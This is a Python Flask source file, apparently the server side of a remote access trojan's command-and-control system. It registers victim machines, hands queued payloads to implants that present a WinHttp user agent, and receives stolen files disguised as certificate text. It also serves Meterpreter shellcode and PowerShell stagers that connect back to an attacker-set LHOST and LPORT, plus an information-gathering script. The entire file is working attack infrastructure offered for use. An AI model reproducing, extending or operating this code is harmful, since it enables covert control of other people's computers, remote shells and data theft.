#!/usr/bin/python
# coding: UTF-8
import sys
import hashlib
import time
import os
import re
from urllib import unquote
import base64
import socket, struct
reload(sys)
sys.setdefaultencoding('utf-8')

import payload
from config import *
from models import victim, action, upload, settings

from flask import Module, request, make_response, render_template_string, render_template
client = Module(__name__)

server = '%s:%d'%(host, port)

def md5(s):
    return hashlib.md5(s).hexdigest()

@client.route("/connect", methods=['GET'])
def connect():
    if not 'WinHttp.WinHttpRequest' in request.headers.get('User-Agent'):
        return ''
    global server
    p = payload.payload()
    return render_template_string(p.connect(), server=server)

@client.route("/check", methods=['POST'])
def check():
    global server
    data = unquote(request.get_data())
    #TODO: add data format check
    signature = md5(data+SECRET_KEY)
    c = victim.victim()
    p = payload.payload()
    if not c.get(signature):
        c = c.add(signature, request.remote_addr)
        #添加初始任务
        action.action().add(signature, signature, 'init', p.init(), 4) #add init task
    return render_template_string(p.begin(), server=server, signature=signature) 

@client.route('/rat/<signature>', methods=['GET', 'POST'])
def rat(signature):
    global server
    c = victim.victim()
    a = action.action()
    p = payload.payload()
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, signature):
        return "error"
    if not c.get(signature):
        return 'error'
    if request.method == 'GET':
        c = victim.victim()
        pattern = r"^[0-9a-f]{32}$"
        if not re.match(pattern, signature):
            return 'error'
        if not c.get(signature):
            return 'error'
        c.heartbeat(signature)
        #TODO:添加全局任务

        #查找未完成任务
        ac = a.gettask(signature)

        if ac and signature == ac['pid']:
            a.setfeedback(signature, 'done')
            exploit = ac['payload']
            pid = ac['pid']
        elif ac and ac['repeat']<3:
            exploit = ac['payload']
            pid = ac['pid']
            a.addrepeat(pid)
        else:
            exploit = ''
            pid = 'heartbeat'
        return render_template_string(exploit, server=server, signature=signature, pid=pid)
    else:
        pid = request.args.get('pid')
        pattern = r"^[0-9a-f]{32}$"
        if not re.match(pattern, pid):
            return "error"
        data = request.get_data().encode('base64')
        a.setfeedback(pid, data)
        return ''

@client.route("/upload/<signature>", methods=['POST'])
def upload_controller(signature):
    c = victim.victim()
    u = upload.upload()
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, signature):
        return 'error'
    if not c.get(signature):
        return 'error'
    data = unquote(request.get_data())
    data = data.replace('-----BEGIN CERTIFICATE-----', '')
    data = data.replace('-----END CERTIFICATE-----', '')
    data = data.strip()
    try:
        data = base64.b64decode(data)
    except Exception as e:
        return 'error'
    originalname = request.args.get('filename')
    pid = request.args.get('pid')
    filename = md5(data)
    if not os.path.exists(upload_dir+os.sep+signature):
        os.mkdir(upload_dir+os.sep+signature, 0700)
    with open(upload_dir+os.sep+signature+os.sep+filename, 'w') as f:
        f.write(data)
    u.add(signature, pid, originalname, filename)
    resp = make_response(filename, 200)
    return resp

@client.route("/download", methods=['GET'])
def download_controller():
    filename = request.args.get('filename')
    if not filename:
        return 'error'
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, filename):
        return 'error'
    if not os.path.exists(download_dir+os.sep+filename):
        return 'error'
    with open(download_dir+os.sep+filename, 'r') as f:
        data = f.read()
    return base64.b64encode(data)

@client.route("/met_sc/<signature>", methods=['GET'])
def MeterpreterShellcode(signature):
    c = victim.victim()
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, signature):
        return "error"
    if not c.get(signature):
        return 'error'
    s = settings.settings()
    ip = ''
    for i in socket.inet_aton(socket.gethostbyname(s.get('LHOST'))):
        ip += hex(ord(i)) + ', '

    port = ''
    for i in struct.pack('!I', int(s.get('LPORT')))[-2:]:
        port += hex(ord(i)) + ', '
    return render_template('InstallUtilShellcodeExec.cs', ip=ip, port=port)

@client.route("/met_ps/<signature>", methods=['GET'])
def PowershelMeterpreter(signature):
    c = victim.victim()
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, signature):
        return "error"
    if not c.get(signature):
        return 'error'
    s = settings.settings()
    ip = ''
    for i in socket.inet_aton(socket.gethostbyname(s.get('LHOST'))):
        ip += hex(ord(i)) + ', '

    port = ''
    for i in struct.pack('!I', int(s.get('LPORT')))[-2:]:
        port += hex(ord(i)) + ', '
    return render_template('PowershellMeterpreterx86.ps1', ip=ip, port=port)

@client.route("/ps_info/<signature>", methods=['GET'])
def PowershelInformation(signature):
    c = victim.victim()
    pattern = r"^[0-9a-f]{32}$"
    if not re.match(pattern, signature):
        return "error"
    if not c.get(signature):
        return 'error'
    return render_template('GatherInformation.ps1')
